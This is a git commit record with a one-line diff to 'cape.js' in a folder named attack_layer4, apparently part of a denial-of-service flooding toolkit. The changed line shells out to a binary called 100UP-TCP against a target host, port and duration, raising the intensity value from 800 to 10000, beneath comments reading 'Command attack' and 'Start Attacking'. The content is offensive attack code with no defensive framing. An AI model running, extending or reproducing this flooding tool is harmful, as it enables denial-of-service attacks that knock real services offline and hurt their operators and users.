487357a41478ac12b44a60464df6940fbcc65cd8
apaple <76417012+apaple@users.noreply.github.com>
2022-12-18 12:25:38 +0700

    Update cape.js

--- attack_layer4/cape.js
+++ attack_layer4/cape.js
@@ -73,7 +73,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`./100UP-TCP GET ${host} ${port} ${time} 800`, (error, stdout, stderr) => {
+exec(`./100UP-TCP GET ${host} ${port} ${time} 10000`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
